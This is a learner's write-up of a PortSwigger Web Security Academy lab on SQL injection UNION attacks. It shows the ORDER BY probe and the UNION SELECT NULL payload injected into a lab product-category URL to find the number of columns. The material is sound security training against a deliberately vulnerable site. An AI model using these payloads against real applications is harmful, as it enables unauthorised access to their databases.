# Lab: SQL injection UNION attack, determining the number of columns returned by the query

## Lab's description

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.

**End goal :**  determine the number of columns returned by the query by performing a SQL injection UNION attack 

## Solution

First, I choose any type of category
`https://0a7500830322a6b781704d6000b40045.web-security-academy.net/filter?category=Pets`

Now, I try to modify the link to determine the number of columns required.

After I try, I can see `' ORDER BY 4--` display error. That means it has 3 columns. So I can exploit the payload: `' UNION SELECT NULL, NULL, NULL--`

`https://0a7500830322a6b781704d6000b40045.web-security-academy.net/filter?category=Pets'+UNION+SELECT+NULL,NULL,NULL--`

**Source:** [Lab: Determining the number of columns required](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-determining-the-number-of-columns-required/sql-injection/union-attacks/lab-determine-number-of-columns)
